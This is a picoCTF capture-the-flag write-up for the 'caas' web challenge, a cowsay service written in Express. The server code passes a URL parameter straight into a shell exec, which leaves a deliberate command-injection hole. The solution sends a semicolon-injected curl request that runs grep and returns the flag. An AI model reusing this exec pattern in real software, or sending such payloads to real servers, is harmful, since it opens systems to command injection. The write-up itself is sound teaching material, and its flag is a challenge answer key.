# caas
Web, 150 points

## Description

> Now presenting cowsay as a service

A Javascript file was attached:

```javascript
const express = require('express');
const app = express();
const { exec } = require('child_process');

app.use(express.static('public'));

app.get('/cowsay/:message', (req, res) => {
  exec(`/usr/games/cowsay ${req.params.message}`, (error, stdout) => {
    if (error) return res.status(500).end();
    res.type('txt').send(stdout).end();
  });
});

app.listen(3000, () => {
  console.log('listening');
});

```

## Solution

Visiting the attached website, we see the following page:

```
Cowsay as a Service
Make a request to the following URL to cowsay your message:
https://caas.mars.picoctf.net/cowsay/{message}
```

Let's try it:

```console
┌──(user@kali)-[/media/sf_CTFs/pico/caas]
└─$ curl https://caas.mars.picoctf.net/cowsay/test
 ______
< test >
 ------
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
```

Indeed, looks like `cowsay` as a service.

According to the implementation, the code calls:

```javascript
exec(`/usr/games/cowsay ${req.params.message}`
```

So we can try to perform a command injection by sneaking in an additional command after ending the current one with a `;`.

```console
┌──(user@kali)-[/media/sf_CTFs/pico/caas]
└─$ curl "https://caas.mars.picoctf.net/cowsay/Hello; grep -r pico"
 _______
< Hello >
 -------
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
falg.txt:picoCTF{moooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0o}
```

